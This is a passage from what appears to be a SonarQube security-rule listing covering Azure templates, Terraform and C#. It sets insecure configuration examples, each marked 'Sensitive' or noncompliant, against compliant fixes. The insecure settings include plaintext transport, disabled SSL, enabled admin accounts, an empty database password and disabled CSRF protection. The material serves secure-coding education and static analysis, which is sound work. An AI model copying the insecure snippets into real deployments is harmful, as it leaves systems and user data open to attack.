<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.cdn/profiles/endpoints">Microsoft.Cdn/profiles/endpoints</a>:</p>
<pre data-diff-id="5" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Cdn/profiles/endpoints",
      "name": "profiles/example",
      "apiVersion": "2021-06-01",
      "properties": {
        "isHttpAllowed": true
      }
    }
  ]
}
</pre>
<pre data-diff-id="12" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.Cdn/profiles/endpoints@2021-06-01' = {
  properties: {
    isHttpAllowed: true // Sensitive
  }
}
</pre>
<p>For <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.cache/redisenterprise/databases">Microsoft.Cache/redisEnterprise/databases</a>:</p>
<pre data-diff-id="6" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Cache/redisEnterprise/databases",
      "name": "redisEnterprise/example",
      "apiVersion": "2022-01-01",
      "properties": {
        "clientProtocol": "Plaintext"
      }
    }
  ]
}
</pre>
<pre data-diff-id="13" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.Cache/redisEnterprise/databases@2022-01-01' = {
  properties: {
    clientProtocol: 'Plaintext' // Sensitive
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformysql/servers">Microsoft.DBforMySQL/servers</a>, <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformariadb/servers">Microsoft.DBforMariaDB/servers</a>, and <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbforpostgresql/servers">Microsoft.DBforPostgreSQL/servers</a>:</p>
<pre data-diff-id="7" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.DBforMySQL/servers",
      "name": "example",
      "apiVersion": "2017-12-01",
      "properties": {
        "sslEnforcement": "Disabled"
      }
    }
  ]
}
</pre>
<pre data-diff-id="14" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.DBforMySQL/servers@2017-12-01' = {
  properties: {
    sslEnforcement: 'Disabled' // Sensitive
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites">Microsoft.Web/sites</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Web/sites",
      "name": "example",
      "apiVersion": "2022-09-01",
      "properties": {
        "httpsOnly": true
      }
    }
  ]
}
</pre>
<pre data-diff-id="8" data-diff-type="compliant">
resource symbolicname 'Microsoft.Web/sites@2022-03-01' = {
  properties: {
    httpsOnly: true
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites/config-web">Microsoft.Web/sites/config</a>:</p>
<pre data-diff-id="2" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Web/sites/config",
      "name": "sites/example",
      "apiVersion": "2022-09-01",
      "properties": {
        "ftpsState": "FtpsOnly"
      }
    }
  ]
}
</pre>
<pre data-diff-id="9" data-diff-type="compliant">
resource symbolicname 'Microsoft.Web/sites/config@2022-09-01' = {
  properties: {
    ftpsState: 'FtpsOnly'
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.storage/storageaccounts">Microsoft.Storage/storageAccounts</a>:</p>
<pre data-diff-id="3" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Storage/storageAccounts",
      "name": "example",
      "apiVersion": "2022-09-01",
      "properties": {
        "supportsHttpsTrafficOnly": true
      }
    }
  ]
}
</pre>
<pre data-diff-id="10" data-diff-type="compliant">
resource symbolicname 'Microsoft.Storage/storageAccounts@2022-09-01' = {
  properties: {
    supportsHttpsTrafficOnly: true
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.apimanagement/service/apis">Microsoft.ApiManagement/service/apis</a>:</p>
<pre data-diff-id="4" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.ApiManagement/service/apis",
      "name": "service/example",
      "apiVersion": "2022-08-01",
      "properties": {
        "protocols": ["https"]
      }
    }
  ]
}
</pre>
<pre data-diff-id="11" data-diff-type="compliant">
resource symbolicname 'Microsoft.ApiManagement/service/apis@2022-08-01' = {
  properties: {
    protocols: ['https']
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.cdn/profiles/endpoints">Microsoft.Cdn/profiles/endpoints</a>:</p>
<pre data-diff-id="5" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Cdn/profiles/endpoints",
      "name": "profiles/example",
      "apiVersion": "2021-06-01",
      "properties": {
        "isHttpAllowed": false
      }
    }
  ]
}
</pre>
<pre data-diff-id="12" data-diff-type="compliant">
resource symbolicname 'Microsoft.Cdn/profiles/endpoints@2021-06-01' = {
  properties: {
    isHttpAllowed: false
  }
}
</pre>
<p>For <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.cache/redisenterprise/databases">Microsoft.Cache/redisEnterprise/databases</a>:</p>
<pre data-diff-id="6" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Cache/redisEnterprise/databases",
      "name": "redisEnterprise/example",
      "apiVersion": "2022-01-01",
      "properties": {
        "clientProtocol": "Encrypted"
      }
    }
  ]
}
</pre>
<pre data-diff-id="13" data-diff-type="compliant">
resource symbolicname 'Microsoft.Cache/redisEnterprise/databases@2022-01-01' = {
  properties: {
    clientProtocol: 'Encrypted'
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformysql/servers">Microsoft.DBforMySQL/servers</a>, <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformariadb/servers">Microsoft.DBforMariaDB/servers</a>, and <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbforpostgresql/servers">Microsoft.DBforPostgreSQL/servers</a>:</p>
<pre data-diff-id="7" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.DBforMySQL/servers",
      "name": "example",
      "apiVersion": "2017-12-01",
      "properties": {
        "sslEnforcement": "Enabled"
      }
    }
  ]
}
</pre>
<pre data-diff-id="14" data-diff-type="compliant">
resource symbolicname 'Microsoft.DBforMySQL/servers@2017-12-01' = {
  properties: {
    sslEnforcement: 'Enabled'
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/319">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>
  <li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html">Google, Moving towards more secure web</a> </li>
  <li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/">Mozilla, Deprecating non secure http</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6379">
              azureresourcemanager:S6379
            </a>
          </td>
          <td>
            <details>
              <p>Enabling Azure resource-specific admin accounts can reduce an organization’s ability to protect itself against account or service account
thefts.</p>
<p>Full Administrator permissions fail to correctly separate duties and create potentially critical attack vectors on the impacted resources.</p>
<p>In case of abuse of elevated permissions, both the data on which impacted resources operate and their access traceability are at risk.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This Azure resource is essential for the information system infrastructure. </li>
  <li> This Azure resource is essential for mission-critical functions. </li>
  <li> Compliance policies require this resource to disable its administrative accounts or permissions. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Disable the administrative accounts or permissions in this Azure resource.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.microsoft.com/en-us/azure/batch/nodes-and-pools#pools">Azure Batch Pools</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Batch/batchAccounts/pools",
      "apiVersion": "2022-10-01",
      "properties": {
        "startTask": {
          "userIdentity": {
            "autoUser": {
              "elevationLevel": "Admin"
            }
          }
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="3" data-diff-type="noncompliant">
resource AdminBatchPool 'Microsoft.Batch/batchAccounts/pools@2022-10-01' = {
  properties: {
    startTask: {
      userIdentity: {
        autoUser: {
          elevationLevel: 'Admin' // Sensitive
        }
      }
    }
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/container-registry/">Azure Container Registries</a>:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.ContainerRegistry/registries",
      "apiVersion": "2023-01-01-preview",
      "properties": {
        "adminUserEnabled": true
      }
    }
  ]
}
</pre>
<pre data-diff-id="4" data-diff-type="noncompliant">
resource acrAdminUserDisabled 'Microsoft.ContainerRegistry/registries@2021-09-01' = {
  properties: {
    adminUserEnabled: true // Sensitive
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.microsoft.com/en-us/azure/batch/nodes-and-pools#pools">Azure Batch Pools</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Batch/batchAccounts/pools",
      "apiVersion": "2022-10-01",
      "properties": {
        "startTask": {
          "userIdentity": {
            "autoUser": {
              "elevationLevel": "NonAdmin"
            }
          }
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
resource AdminBatchPool 'Microsoft.Batch/batchAccounts/pools@2022-10-01' = {
  properties: {
    startTask: {
      userIdentity: {
        autoUser: {
          elevationLevel: 'NonAdmin'
        }
      }
    }
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/container-registry/">Azure Container Registries</a>:</p>
<pre data-diff-id="2" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.ContainerRegistry/registries",
      "apiVersion": "2023-01-01-preview",
      "properties": {
        "adminUserEnabled": false
      }
    }
  ]
}
</pre>
<pre data-diff-id="4" data-diff-type="compliant">
resource acrAdminUserDisabled 'Microsoft.ContainerRegistry/registries@2021-09-01' = {
  properties: {
    adminUserEnabled: false
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6303">
              terraform:S6303
            </a>
          </td>
          <td>
            <details>
              <p>Using unencrypted RDS DB resources exposes data to unauthorized access.<br> This includes database data, logs, automatic backups, read replicas,
snapshots, and cluster metadata.</p>
<p>This situation can occur in a variety of scenarios, such as:</p>
<ul>
  <li> A malicious insider working at the cloud provider gains physical access to the storage device. </li>
  <li> Unknown attackers penetrate the cloud provider’s logical infrastructure and systems. </li>
</ul>
<p>After a successful intrusion, the underlying applications are exposed to:</p>
<ul>
  <li> theft of intellectual property and/or personal data </li>
  <li> extortion </li>
  <li> denial of services and security bypasses via data corruption or deletion </li>
</ul>
<p>AWS-managed encryption at rest reduces this risk with a simple switch.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The database contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to enable encryption at rest on any RDS DB resource, regardless of the engine.<br> In any case, no further maintenance is
required as encryption at rest is fully managed by AWS.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance">aws_db_instance</a> and <a
href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster">aws_rds_cluster</a>:</p>
<pre>
resource "aws_db_instance" "example" {
  storage_encrypted = false # Sensitive, disabled by default
}

resource "aws_rds_cluster" "example" {
  storage_encrypted = false # Sensitive, disabled by default
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance">aws_db_instance</a> and <a
href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster">aws_rds_cluster</a>:</p>
<pre>
resource "aws_db_instance" "example" {
  storage_encrypted = true
}

resource "aws_rds_cluster" "example" {
  storage_encrypted = true
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html">AWS Documentation</a> - Encrypting Amazon RDS
  resources </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6379">
              terraform:S6379
            </a>
          </td>
          <td>
            <details>
              <p>Enabling Azure resource-specific admin accounts can reduce an organization’s ability to protect itself against account or service account
thefts.</p>
<p>Full Administrator permissions fail to correctly separate duties and create potentially critical attack vectors on the impacted resources.</p>
<p>In case of abuse of elevated permissions, both the data on which impacted resources operate and their access traceability are at risk.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This Azure resource is essential for the information system infrastructure. </li>
  <li> This Azure resource is essential for mission-critical functions. </li>
  <li> Compliance policies require this resource to disable its administrative accounts or permissions. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Disable the administrative accounts or permissions in this Azure resource.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.microsoft.com/en-us/azure/batch/nodes-and-pools#pools">Azure Batch Pools</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource "azurerm_batch_pool" "example" {
  name = "sensitive"

  start_task {
    user_identity {
      auto_user {
        elevation_level = "Admin" # Sensitive
        scope = "Task"
      }
    }
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/container-registry/">Azure Container Registries</a>:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
resource "azurerm_container_registry" "example" {
  name = "example"
  admin_enabled = true # Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.microsoft.com/en-us/azure/batch/nodes-and-pools#pools">Azure Batch Pools</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
resource "azurerm_batch_pool" "example" {
  name = "example"

  start_task {
    user_identity {
      auto_user {
        elevation_level = "NonAdmin"
        scope = "Task"
      }
    }
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/container-registry/">Azure Container Registries</a>:</p>
<pre data-diff-id="2" data-diff-type="compliant">
resource "azurerm_container_registry" "exemple" {
  name = "example"
  admin_enabled = false
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S2115">
              csharpsquid:S2115
            </a>
          </td>
          <td>
            <details>
              <p>When accessing a database, an empty password should be avoided as it introduces a weakness.</p>
<h2>Why is this an issue?</h2>
<p>When a database does not require a password for authentication, it allows anyone to access and manipulate the data stored within it. Exploiting
this vulnerability typically involves identifying the target database and establishing a connection to it without the need for any authentication
credentials.</p>
<h3>What is the potential impact?</h3>
<p>Once connected, an attacker can perform various malicious actions, such as viewing, modifying, or deleting sensitive information, potentially
leading to data breaches or unauthorized access to critical systems. It is crucial to address this vulnerability promptly to ensure the security and
integrity of the database and the data it contains.</p>
<h4>Unauthorized Access to Sensitive Data</h4>
<p>When a database lacks a password for authentication, it opens the door for unauthorized individuals to gain access to sensitive data. This can
include personally identifiable information (PII), financial records, intellectual property, or any other confidential information stored in the
database. Without proper access controls in place, malicious actors can exploit this vulnerability to retrieve sensitive data, potentially leading to
identity theft, financial loss, or reputational damage.</p>
<h4>Compromise of System Integrity</h4>
<p>Without a password requirement, unauthorized individuals can gain unrestricted access to a database, potentially compromising the integrity of the
entire system. Attackers can inject malicious code, alter configurations, or manipulate data within the database, leading to system malfunctions,
unauthorized system access, or even complete system compromise. This can disrupt business operations, cause financial losses, and expose the
organization to further security risks.</p>
<h4>Unwanted Modifications or Deletions</h4>
<p>The absence of a password for database access allows anyone to make modifications or deletions to the data stored within it. This poses a
significant risk, as unauthorized changes can lead to data corruption, loss of critical information, or the introduction of malicious content. For
example, an attacker could modify financial records, tamper with customer orders, or delete important files, causing severe disruptions to business
processes and potentially leading to financial and legal consequences.</p>
<p>Overall, the lack of a password configured to access a database poses a serious security risk, enabling unauthorized access, data breaches, system
compromise, and unwanted modifications or deletions. It is essential to address this vulnerability promptly to safeguard sensitive data, maintain
system integrity, and protect the organization from potential harm.</p>
<h2>How to fix it in Entity Framework Core</h2>
<h3>Code examples</h3>
<p>The following code uses an empty password to connect to a SQL Server database.</p>
<p>The vulnerability can be fixed by using Windows authentication (sometimes referred to as integrated security).</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="302" data-diff-type="noncompliant">
protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)
{
  optionsBuilder.UseSqlServer("Server=myServerAddress;Database=myDataBase;User Id=myUsername;Password="); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="302" data-diff-type="compliant">
protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)
{
  optionsBuilder.UseSqlServer("Server=myServerAddress;Database=myDataBase;Integrated Security=True");
}
</pre>
<h3>How does this work?</h3>
<h4>Windows authentication (integrated security)</h4>
<p>When the connection string includes the <code>Integrated Security=true</code> parameter, it enables Windows authentication (sometimes called
integrated security) for the database connection. With integrated security, the user’s Windows credentials are used to authenticate and authorize
access to the database. It eliminates the need for a separate username and password for the database connection. Integrated security simplifies
authentication and leverages the existing Windows authentication infrastructure for secure database access in your C# application.</p>
<p>It’s important to note that when using integrated security, the user running the application must have the necessary permissions to access the
database. Ensure that the user account running the application has the appropriate privileges and is granted access to the database.</p>
<p>The syntax employed in connection strings varies by provider:</p>
<table>
  <colgroup>
    <col style="width: 50%;">
    <col style="width: 50%;">
  </colgroup>
  <tbody>
    <tr>
      <td><p>Syntax</p></td>
      <td><p>Supported by</p></td>
    </tr>
    <tr>
      <td><p><code>Integrated Security=true;</code></p></td>
      <td><p>SQL Server, Oracle, Postgres</p></td>
    </tr>
    <tr>
      <td><p><code>Integrated Security=SSPI;</code></p></td>
      <td><p>SQL Server, OLE DB</p></td>
    </tr>
    <tr>
      <td><p><code>Integrated Security=yes;</code></p></td>
      <td><p>MySQL</p></td>
    </tr>
    <tr>
      <td><p><code>Trusted_Connection=true;</code></p></td>
      <td><p>SQL Server</p></td>
    </tr>
    <tr>
      <td><p><code>Trusted_Connection=yes;</code></p></td>
      <td><p>ODBC</p></td>
    </tr>
  </tbody>
</table>
<p>Note: Some providers such as MySQL do not support Windows authentication with .NET Core.</p>
<h3>Pitfalls</h3>
<h4>Hard-coded passwords</h4>
<p>It could be tempting to replace the empty password with a hard-coded one. Hard-coding passwords in the code can pose significant security risks.
Here are a few reasons why it is not recommended:</p>
<ol>
  <li> Security Vulnerability: Hard-coded passwords can be easily discovered by anyone who has access to the code, such as other developers or
  attackers. This can lead to unauthorized access to the database and potential data breaches. </li>
  <li> Lack of Flexibility: Hard-coded passwords make it difficult to change the password without modifying the code. If the password needs to be
  updated, it would require recompiling and redeploying the code, which can be time-consuming and error-prone. </li>
  <li> Version Control Issues: Storing passwords in code can lead to version control issues. If the code is shared or stored in a version control
  system, the password will be visible to anyone with access to the repository, which is a security risk. </li>
</ol>
<p>To mitigate these risks, it is recommended to use secure methods for storing and retrieving passwords, such as using environment variables,
configuration files, or secure key management systems. These methods allow for better security, flexibility, and separation of sensitive information
from the codebase.</p>
<h2>Resources</h2>
<ul>
  <li> <a href="https://docs.microsoft.com/en-us/troubleshoot/aspnet/create-web-config">Create the Web.config file for an ASP.NET application</a>
  </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/521">CWE-521 - Weak Password Requirements</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4502">
              csharpsquid:S4502
            </a>
          </td>
          <td>
            <details>
              <p>A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be forced, by an attacker, to perform sensitive
actions that he didn’t intend, such as updating his profile or sending a message, more generally anything that can change the state of the
application.</p>
<p>The attacker can trick the user/victim to click on a link, corresponding to the privileged action, or to visit a malicious web site that embeds a
hidden web request and as web browsers automatically include cookies, the actions can be authenticated and sensitive.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The web application uses cookies to authenticate users. </li>
  <li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li>
  <li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Protection against CSRF attacks is strongly recommended:
    <ul>
      <li> to be activated by default for all <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods">unsafe HTTP
      methods</a>. </li>
      <li> implemented, for example, with an unguessable CSRF token </li>
    </ul>  </li>
  <li> Of course all sensitive operations should not be performed with <a
  href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods">safe HTTP</a> methods like <code>GET</code> which are designed to be
  used only for information retrieval. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
public void ConfigureServices(IServiceCollection services)
{
    // ...
    services.AddControllersWithViews(options =&gt; options.Filters.Add(new IgnoreAntiforgeryTokenAttribute())); // Sensitive
    // ...
}
</pre>
<pre>
[HttpPost, IgnoreAntiforgeryToken] // Sensitive
public IActionResult ChangeEmail(ChangeEmailModel model) =&gt; View("~/Views/...");
</pre>
<h2>Compliant Solution</h2>
<pre>
public void ConfigureServices(IServiceCollection services)
{
    // ...
    services.AddControllersWithViews(options =&gt; options.Filters.Add(new AutoValidateAntiforgeryTokenAttribute()));
    // or
    services.AddControllersWithViews(options =&gt; options.Filters.Add(new ValidateAntiForgeryTokenAttribute()));
    // ...
}
</pre>
<pre>
[HttpPost]
[AutoValidateAntiforgeryToken]
public IActionResult ChangeEmail(ChangeEmailModel model) =&gt; View("~/Views/...");
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/352">CWE-352 - Cross-Site Request Forgery (CSRF)</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://owasp.org/www-community/attacks/csrf">OWASP: Cross-Site Request Forgery</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4507">
              csharpsquid:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>
  <li> The application runs by default with debug features activated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers.</p>
<p>The .Net Core framework offers multiple features which help during debug.
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDeveloperExceptionPage</code> and
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDatabaseErrorPage</code> are two of them. Make sure that those features are disabled in
production.</p>
<p>Use <code>if (env.IsDevelopment())</code> to disable debug code.</p>
<h2>Sensitive Code Example</h2>
<p>This rule raises issues when the following .Net Core methods are called:
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDeveloperExceptionPage</code>,
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDatabaseErrorPage</code>.</p>
<pre>
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;

namespace mvcApp
{
    public class Startup2
    {
        public void Configure(IApplicationBuilder app, IHostingEnvironment env)
        {
            // Those calls are Sensitive because it seems that they will run in production
            app.UseDeveloperExceptionPage(); // Sensitive
            app.UseDatabaseErrorPage(); // Sensitive
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;

namespace mvcApp
{
    public class Startup2
    {
        public void Configure(IApplicationBuilder app, IHostingEnvironment env)
        {
            if (env.IsDevelopment())
            {
                // The following calls are ok because they are disabled in production
                app.UseDeveloperExceptionPage(); // Compliant
                app.UseDatabaseErrorPage(); // Compliant
            }
        }
    }
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not analyze configuration files. Make sure that debug mode is not enabled by default in those files.</p>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/489">CWE-489 - Active Debug Code</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/215">CWE-215 - Information Exposure Through Debug Information</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5659">
              csharpsquid:S5659
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows forging of JSON Web Tokens to impersonate other users.</p>
<h2>Why is this an issue?</h2>
<p>JSON Web Tokens (JWTs), a popular method of securely transmitting information between parties as a JSON object, can become a significant security
risk when they are not properly signed with a robust cipher algorithm, left unsigned altogether, or if the signature is not verified. This
vulnerability class allows malicious actors to craft fraudulent tokens, effectively impersonating user identities. In essence, the integrity of a JWT
hinges on the strength and presence of its signature.</p>
<h3>What is the potential impact?</h3>
<p>When a JSON Web Token is not appropriately signed with a strong cipher algorithm or if the signature is not verified, it becomes a significant
threat to data security and the privacy of user identities.</p>
<h4>Impersonation of users</h4>
<p>JWTs are commonly used to represent user authorization claims. They contain information about the user’s identity, user roles, and access rights.
When these tokens are not securely signed, it allows an attacker to forge them. In essence, a weak or missing signature gives an attacker the power to
craft a token that could impersonate any user. For instance, they could create a token for an administrator account, gaining access to high-level
permissions and sensitive data.</p>
<h4>Unauthorized data access</h4>
<p>When a JWT is not securely signed, it can be tampered with by an attacker, and the integrity of the data it carries cannot be trusted. An attacker
can manipulate the content of the token and grant themselves permissions they should not have, leading to unauthorized data access.</p>
<h2>How to fix it in Jwt.Net</h2>
<h3>Code examples</h3>
<p>The following code contains an example of JWT decoding without verification of the signature.</p>
<h4>Noncompliant code example</h4>
